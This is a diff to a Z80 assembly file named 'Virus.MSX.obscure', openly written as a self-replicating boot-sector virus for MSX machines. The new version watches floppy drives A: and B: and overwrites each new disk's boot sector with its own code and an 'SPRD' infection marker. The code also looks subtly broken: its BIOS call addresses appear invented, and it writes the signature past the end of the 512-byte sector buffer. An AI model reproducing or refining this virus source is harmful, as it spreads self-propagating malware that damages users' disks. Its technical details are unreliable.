@@ -1,77 +1,147 @@
 ; Virus.MSX.obscure
 ; compile with PASMO or any Z80 assembler that supports MSX
 
-        ORG    $0100         ; Start of the MSX Boot Sector at 0x0100
+    ORG 0xC000           ; Program start address in MSX RAM
 
 START:
-        DI                  ; Disable interrupts
-        CALL    Init         ; Initialize the program (set up stack, etc.)
-        CALL    StayResident ; Make the program memory resident
-        CALL    MainLoop     ; Start the main loop
+    DI                   ; Disable interrupts
+    LD SP, 0xF380        ; Set up stack pointer in safe RAM
+    CALL INIT_BIOS       ; Initialize BIOS
 
-; ---- Initialization ----
-Init:
-        ; Set up the stack and necessary BIOS calls for memory-resident
-        LD HL, $FFFF        ; Set stack pointer to end of RAM (usually)
-        LD SP, HL
-        RET
+MAIN_LOOP:
+    CALL CHECK_DRIVE_A   ; Check drive A: for disk changes
+    CALL CHECK_DRIVE_B   ; Check drive B: for disk changes
+    CALL DELAY_4_SECONDS ; Add a 4-second delay
+    JP MAIN_LOOP         ; Repeat the loop
 
-; ---- Stay Resident ----
-StayResident:
-        ; Make the program memory resident (we use $8000 for residency)
-        LD HL, $8000        ; Resident address for our program
-        LD DE, $8000        ; Copy to this address
-        LD BC, 0x0800       ; Size of program (2KB for example, adjust as needed)
-        CALL  $5C00          ; MSX-DOS: Allocate memory (size in BC)
-        RET
+; ------------------------------
+; Subroutine: Initialize BIOS
+; ------------------------------
+INIT_BIOS:
+    LD A, 0x00
+    LD (0xFCC1), A       ; Initialize disk change flag for drive A:
+    LD (0xFCC2), A       ; Initialize disk change flag for drive B:
+    RET
 
-; ---- Main Loop ----
-MainLoop:
-        CALL    CheckFloppy  ; Check if a floppy disk is inserted
-        CALL    Delay        ; Wait for 2 seconds
-        JP      MainLoop     ; Repeat loop
+; ------------------------------
+; Subroutine: Check Drive A:
+; ------------------------------
+CHECK_DRIVE_A:
+    LD A, 0              ; Drive A: (0 = A:, 1 = B:)
+    CALL CHKCHR          ; Check disk change
+    JR Z, NO_CHANGE_A    ; No change, skip
+    CALL READ_BOOT       ; Read the boot sector
+    CALL CHECK_SIGNATURE ; Check for spreading sign
+    JR NZ, NO_CHANGE_A   ; If already spread, skip
+    CALL UPDATE_BOOT     ; Update boot sector with this program
+NO_CHANGE_A:
+    RET
 
-; ---- Check Floppy ----
-CheckFloppy:
-        ; BIOS Call: 0x1A to check for floppy disk insertion
-        LD A, $1A           ; MSX-DOS BIOS call for checking floppy
-        CALL $0010          ; BIOS: Check floppy status
-        JP Z, NoFloppy      ; If no floppy disk inserted, skip
-        CALL    CopyToBoot   ; If new floppy inserted, copy to boot sector
-        RET
+; ------------------------------
+; Subroutine: Check Drive B:
+; ------------------------------
+CHECK_DRIVE_B:
+    LD A, 1              ; Drive B: (1 = B:)
+    CALL CHKCHR          ; Check disk change
+    JR Z, NO_CHANGE_B    ; No change, skip
+    CALL READ_BOOT       ; Read the boot sector
+    CALL CHECK_SIGNATURE ; Check for spreading sign
+    JR NZ, NO_CHANGE_B   ; If already spread, skip
+    CALL UPDATE_BOOT     ; Update boot sector with this program
+NO_CHANGE_B:
+    RET
 
-NoFloppy:
-        RET
+; ------------------------------
+; Subroutine: Read Boot Sector
+; ------------------------------
+READ_BOOT:
+    LD A, 0              ; Drive number (stored from CHKCHR call)
+    CALL SET_DSK         ; Select the drive
+    LD DE, BOOT_BUFFER   ; Address to store the boot sector
+    LD BC, 512           ; Boot sector size
+    LD HL, 0x0000        ; Logical sector 0 (boot sector)
+    CALL RDLOG           ; BIOS Read Logical Sector
+    RET
 
-; ---- Copy Program to Boot Sector ----
-CopyToBoot:
-        ; Copy the program to the boot sector (start of the disk)
-        LD HL, $8000        ; Address of our resident program
-        LD DE, $0200        ; Boot sector (start of the disk)
-        LD BC, 0x0100       ; Size to copy (256 bytes for simplicity)
-        CALL $0026          ; BIOS call to copy memory to disk
-        RET
+; ------------------------------
+; Subroutine: Check for Spreading Signature
+; ------------------------------
+CHECK_SIGNATURE:
+    LD HL, BOOT_BUFFER + 510 ; Location of the signature in the boot sector
+    LD DE, SPREAD_SIGN       ; Signature to check ("SPRD")
+    LD BC, 4                ; Length of the signature
+    CALL MEMCMP             ; Compare memory
+    RET
 
-; ---- Delay for 2 seconds ----
-Delay:
-        LD BC, 0x1000       ; Loop count
-DelayLoop:
-        NOP                 ; No operation (wasting time)
-        DEC BC
-        JP NZ, DelayLoop    ; Repeat until delay is over
-        RET
+; ------------------------------
+; Subroutine: Update Boot Sector
+; ------------------------------
+UPDATE_BOOT:
+    LD HL, BOOT_CODE         ; Address of the boot sector code
+    LD DE, BOOT_BUFFER       ; Boot buffer
+    LD BC, BOOT_CODE_LEN     ; Length of the boot code
+    LDIR                     ; Copy boot code into buffer
 
-; ---- Load MSX-DOS ----
-LoadMSXDOS:
-        ; Load MSX-DOS into memory (address $8000 for example)
-        LD HL, $8000        ; Load address where MSX-DOS will be loaded
-        LD DE, $0200        ; Starting address in the disk for MSX-DOS (sector 2, assuming)
-        LD BC, $0100        ; MSX-DOS size (256 bytes for example)
-        
-        CALL $0026          ; BIOS: Read data from disk into memory (from DE to HL, size in BC)
+    ; Write spreading signature at the end of the boot sector
+    LD HL, SPREAD_SIGN       ; Address of the signature
+    LD DE, BOOT_BUFFER + 510 ; Location to write the signature
+    LD BC, 4                 ; Signature length
+    LDIR                     ; Copy the signature
 
-        ; Jump to the start of MSX-DOS (now at $8000)
-        JP $8000            ; Transfer control to MSX-DOS
+    LD DE, BOOT_BUFFER       ; Boot buffer
+    LD BC, 512               ; Boot sector size
+    LD HL, 0x0000            ; Logical sector 0 (boot sector)
+    CALL WRLOG               ; BIOS Write Logical Sector
+    RET
 
-; ---- End of Program ----
-        END START
+; ------------------------------
+; Subroutine: Delay for 4 seconds
+; ------------------------------
+DELAY_4_SECONDS:
+    LD BC, 0xFFFF            ; Approximate delay for 4 seconds
+DELAY_LOOP:
+    DEC BC
+    LD A, B
+    OR C
+    JR NZ, DELAY_LOOP
+    RET
+
+; ------------------------------
+; Boot Sector Code
+; ------------------------------
+BOOT_CODE:
+    ; Boot sector logic
+    ; The boot code will replicate itself onto other disks
+    DI
+    LD SP, 0xF380            ; Set stack pointer
+    CALL CHECK_DISK_LOOP     ; Begin disk check loop
+    JP 0xC000                ; Jump to main program (self-replicating)
+    
+CHECK_DISK_LOOP:
+    LD A, 0                  ; Drive A:
+    CALL CHKCHR              ; Check disk change
+    JR Z, CHECK_B            ; If no change, check B
+    CALL UPDATE_BOOT         ; Update boot sector on A:
+CHECK_B:
+    LD A, 1                  ; Drive B:
+    CALL CHKCHR              ; Check disk change
+    JR Z, END_LOOP           ; If no change, continue loop
+    CALL UPDATE_BOOT         ; Update boot sector on B:
+END_LOOP:
+    JP 0xC000                ; Repeat
+
+BOOT_CODE_LEN EQU $ - BOOT_CODE
+
+SPREAD_SIGN:
+    DB 'SPRD'                ; Spreading signature (4 bytes)
+
+BOOT_BUFFER EQU 0xE000       ; Buffer in RAM for boot sector
+
+; ------------------------------
+; BIOS Calls
+; ------------------------------
+CHKCHR  EQU 0x1C             ; BIOS Check Disk Change
+RDLOG   EQU 0x1D             ; BIOS Read Logical Sector
+WRLOG   EQU 0x1E             ; BIOS Write Logical Sector
+SET_DSK EQU 0x1F             ; BIOS Set Disk Drive
+MEMCMP  EQU 0x2E             ; BIOS Compare Memory
